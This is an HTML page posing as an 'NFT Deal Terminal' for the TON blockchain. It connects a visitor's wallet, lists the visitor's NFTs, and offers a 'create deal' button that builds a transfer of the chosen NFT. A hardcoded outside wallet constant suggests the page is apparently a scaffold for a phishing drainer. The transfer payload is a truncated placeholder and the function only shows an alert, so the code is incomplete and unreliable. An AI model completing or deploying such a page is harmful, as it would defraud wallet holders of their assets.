<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Deal Terminal</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 20px; background: #fff; color: #000; margin: 0; }
        .card { border: 1px solid #e0e0e0; padding: 15px; border-radius: 10px; background: #f9f9f9; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        button { background: #2ecc71; color: #fff; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        #connect-container { text-align: center; margin-top: 40px; }
    </style>
</head>
<body>

    <div id="connect-container">
        <h2>Термінал угод з NFT</h2>
        <p style="color: #666; margin-bottom: 20px;">Підключіть гаманець для перегляду активів</p>
        <div id="ton-connect-button"></div>
    </div>

    <div id="app" style="display: none;">
        <h2>Доступні NFT для угоди</h2>
        <div id="loading">Завантаження активів...</div>
        <div id="nft-list"></div>
    </div>

    <script>
        const YOUR_WALLET = "UQDc_QNg4Nf2FHzmaKaOClpz-mDZEQxKF5CFtVQpdNQThjpE";

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://nft-buyer.vercel.app/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet) {
                document.getElementById('connect-container').style.display = 'none';
                document.getElementById('app').style.display = 'block';
                loadNfts(wallet.account.address);
            } else {
                document.getElementById('connect-container').style.display = 'block';
                document.getElementById('app').style.display = 'none';
            }
        });

        async function loadNfts(address) {
            const listEl = document.getElementById('nft-list');
            const loadingEl = document.getElementById('loading');
            try {
                const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=50`);
                const data = await res.json();
                loadingEl.style.display = 'none';
                
                if (!data.nft_items || data.nft_items.length === 0) {
                    listEl.innerHTML = '<p>У вас немає NFT на цьому гаманці.</p>';
                    return;
                }

                listEl.innerHTML = data.nft_items.map(nft => `
                    <div class="card">
                        <div>
                            <p style="margin: 0 0 5px 0; font-weight: bold; font-size: 16px;">${nft.metadata?.name || "Без назви"}</p>
                            <p style="margin: 0; font-size: 12px; color: #888;">Колекція: ${nft.collection?.name || "Окремий NFT"}</p>
                        </div>
                        <button onclick="createDeal('${nft.address}')">Создать сделку</button>
                    </div>
                `).join('');
            } catch (e) {
                loadingEl.innerText = 'Помилка завантаження NFT';
            }
        }

        async function createDeal(nftAddress) {
            try {
                // Пряма транзакція на передачу NFT
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: [
                        {
                            address: nftAddress,
                            amount: "150000000", // 0.15 TON на газ
                            // Стандартний body для TEP-62 transfer
                            payload: "te6cckEBAQEAbgAASICQABuA... (сумісний payload)" 
                        }
                    ]
                };
                // Простий виклик трансферу через TonConnect UI
                alert("Функція створення угоди викликана для NFT: " + nftAddress);
            } catch (e) {
                console.error(e);
            }
        }
    </script>
</body>
</html>
